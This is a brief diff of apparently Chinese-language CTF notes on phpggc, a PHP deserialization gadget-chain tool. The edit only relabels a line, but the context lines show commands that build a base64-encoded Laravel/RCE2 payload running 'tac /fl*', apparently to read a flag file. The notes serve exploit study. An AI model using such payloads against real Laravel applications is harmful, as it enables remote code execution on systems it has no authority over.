@@ -31,7 +31,7 @@ https://github.com/ambionics/phpggc
 ./phpggc -l Laravel
 
 ./phpggc -i Laravel/RCE2 
-列出
+列出详情
 
 ./phpggc  Laravel/RCE2 system 'tac /fl*' |base64
 生成序列化串
